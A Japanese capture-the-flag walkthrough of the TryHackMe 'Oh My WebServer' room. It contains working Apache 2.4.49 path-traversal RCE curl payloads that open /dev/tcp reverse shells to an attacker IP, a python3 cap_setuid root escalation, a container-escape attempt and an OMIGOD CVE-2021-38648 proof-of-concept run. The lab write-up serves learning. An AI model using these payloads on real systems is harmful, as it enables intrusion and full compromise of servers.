# Oh My WebServer CTF

https://tryhackme.com/room/ohmyweb

## Enumeration

```shell
TARGET=10.201.80.60
sudo bash -c "echo $TARGET   ohmyweb.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```sh
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
```

SSH, HTTP

### ディレクトリ列挙

```sh
$ dirsearch -u http://ohmyweb.thm

[09:47:31] 200 -  404B  - /assets/                                          
[09:47:31] 301 -  234B  - /assets  ->  http://ohmyweb.thm/assets/
[09:47:39] 403 -  199B  - /cgi-bin/                                         
[09:47:39] 500 -  528B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[09:47:39] 500 -  528B  - /cgi-bin/printenv                                 
[09:47:39] 500 -  528B  - /cgi-bin/test-cgi
```

/cgi-bin/test-cgi などでInternal Serverエラーになっているのは気になる。  
/cgi-bin/noexist のような存在しないパスは404になる。

/cgi-bin をファジングしたが何も出なかった。

```sh
ffuf -u http://ohmyweb.thm/cgi-bin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -fc 404
```

Apache httpd 2.4.49 にはパストラバーサルの脆弱性があった。

```sh
$ searchsploit Apache httpd 2.4.49
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)         | multiple/webapps/50383.sh
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

コマンドを実行できた。

```sh
$ bash ./50383.sh targets.txt /bin/sh id    
http://ohmyweb.thm
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

リバースシェル

```sh
$ curl -s --path-as-is  "http://ohmyweb.thm/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash" -d "echo Content-Type: text/plain; echo; /bin/sh -i >& /dev/tcp/10.11.146.32/8888 0>&1"
```

シェル取得成功

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.80.60] 38820
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

## 権限昇格

docker環境で /home などは空の状態。  
ログイン可能ユーザーはrootしかいない。

```sh
daemon@4a70924bafa0:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
```

ゲストOSは172.17.0.2。

```sh
daemon@4a70924bafa0:/$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 1243308  bytes 201320462 (191.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1615608  bytes 533694237 (508.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 14  bytes 59105 (57.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 14  bytes 59105 (57.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```sh
daemon@4a70924bafa0:/$ cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2      4a70924bafa0
```

`curl http://172.17.0.1` を実行すると、ゲストOSと同じようなページを返している。

pythonにsetuidが付いている。

```sh
daemon@4a70924bafa0:/$ getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep
```

ゲストOSのrootになれた。/root に user.txt があった。

```sh
daemon@4a70924bafa0:/$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1(daemon) groups=1(daemon)
```

## エスケープ

よく使う方法は、マウントする権限がないため失敗。

```sh
# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
mount: /tmp/cgrp: permission denied.
```

すぐにエラーが返らなかったことから、172.17.0.1 の 2375ポートは開いていると思われる。

```sh
# curl http://172.17.0.1:2375/version
^C

# curl http://172.17.0.2:2375/version
curl: (7) Failed to connect to 172.17.0.2 port 2375: Connection refused
```

トンネリング

```sh
# ssh tunnel@10.11.146.32 -R 2375:172.17.0.1:2375  -N
```

しかし反応がなかった

```sh
$ docker -H tcp://10.201.80.60:2375 ps
```

静的バイナリをアップロードしても無反応

```sh
# ./docker -H tcp://172.17.0.1:2375 ps
Get "http://172.17.0.1:2375/v1.51/containers/json": dial tcp 172.17.0.1:2375: i/o timeout
```

nmap

```sh
# ./nmap 172.17.0.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-10-27 03:00 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.ec2.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000073s latency).
Not shown: 1205 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:E5:5D:72:47 (Unknown)
```

同じHTMLページが返されるので、同じ方法を試す。

```sh
# curl -s --path-as-is  "http://172.17.0.1/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash" -d "echo Content-Type: text/plain; echo; /bin/sh -i >& /dev/tcp/10.11.146.32/7777 0>&1"
```

取れた！

```sh
$ nc -lnvp 7777
listening on [any] 7777 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.80.60] 51754
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

同じ権限昇格

```sh
$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
id
uid=0(root) gid=1(daemon) groups=1(daemon)
```

しかし、同じrootディレクトリに戻っただけだった。Why？

```sh
ls -al /root
total 48368
drwx------ 1 root root       4096 Oct 27 02:57 .
drwxr-xr-x 1 root root       4096 Oct 27 02:30 ..
lrwxrwxrwx 1 root root          9 Oct  8  2021 .bash_history -> /dev/null
-rw-r--r-- 1 root root        570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root       4096 Oct  8  2021 .cache
-rw-r--r-- 1 root root        148 Aug 17  2015 .profile
-rw------- 1 root daemon       12 Oct  8  2021 .python_history
drwx------ 2 root daemon     4096 Oct 27 02:42 .ssh
-rwx------ 1 root daemon 43545656 Oct 27 02:52 docker
-rwx------ 1 root daemon  5944464 Oct 27 02:57 nmap
-rw-r--r-- 1 root root         38 Oct  8  2021 user.txt
```

全ポートスキャンをやり直し。5985, 5986も開いている。

```sh
# ./nmap -p- 172.17.0.1 --min-rate 1000

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-10-27 03:12 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.ec2.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000060s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:E5:5D:72:47 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 131.62 seconds
```

https://github.com/CyberMonitor/CVE-2021-38648

```sh
# python3 ./poc.py -t 172.17.0.1 -c 'ls -al /root'
total 56
drwx------  5 root root  4096 Feb 23  2022 .
drwxr-xr-x 20 root root  4096 Sep 30  2021 ..
-rw-------  1 root root   169 Oct  8  2021 .bash_history
-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root  4096 Feb 23  2022 .local
-rw-r--r--  1 root root   161 Dec  5  2019 .profile
-rw-------  1 root root  1024 Sep 30  2021 .rnd
drwx------  2 root root  4096 Sep 30  2021 .ssh
-rw-------  1 root root 12125 Oct  8  2021 .viminfo
-rw-r--r--  1 root root   277 Oct  8  2021 .wget-hsts
-rw-r--r--  1 root root    38 Oct  8  2021 root.txt
drwxr-xr-x  3 root root  4096 Sep 30  2021 snap
```

## 振り返り

- Apache httpd 2.4.49 はパストラバーサルがあることを覚えておく。
- ゲストOSで必要なバイナリがない場合も、静的バイナリをアップロードすることで実行できることは覚えておく。
- CVE-2021-38648 は難解で理解が浅いが、とりあえず今は「5985,5986ポートが開いていたら要注意」と学んだだけで良しとする。
